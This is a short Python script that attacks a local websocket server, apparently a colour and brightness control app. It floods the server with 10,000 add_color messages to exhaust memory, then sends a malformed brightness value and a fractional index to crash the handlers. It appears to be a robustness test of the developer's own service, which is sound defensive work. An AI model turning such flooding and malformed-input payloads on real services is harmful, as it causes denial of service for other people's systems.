import asyncio
import websockets
import json

async def attack():
    uri = "ws://localhost:8080/ws"
    try:
        async with websockets.connect(uri) as ws:
            print("Connected! Starting attack...")
            
            # Attack 1: Queue Flooding (OOM DoS)
            print("Flooding the color queue to cause Out of Memory / Event Loop Blocking...")
            payload = json.dumps({"action": "add_color", "color": [255, 0, 0]})
            for i in range(10000): # Sending 10k items
                await ws.send(payload)
                
            print("Sent 10000 add_color requests.")
            
            # Wait a bit to observe latency
            await asyncio.sleep(2)
            
            # Attack 2: Bad Types (Crashing handler)
            print("Sending invalid type to set_brightness to crash handler...")
            payload = json.dumps({"action": "set_brightness", "level": "one hundred"})
            await ws.send(payload)
            print("Sent invalid level.")
            
            # Attack 3: Out of Bounds Index
            print("Sending invalid index to remove_color_idx...")
            payload = json.dumps({"action": "remove_color_idx", "index": 1.5})
            try:
                await ws.send(payload)
            except Exception as e:
                print(f"Connection already closed: {e}")
                
            print("Attack complete.")
            
    except Exception as e:
        print(f"Failed: {e}")

if __name__ == "__main__":
    asyncio.run(attack())
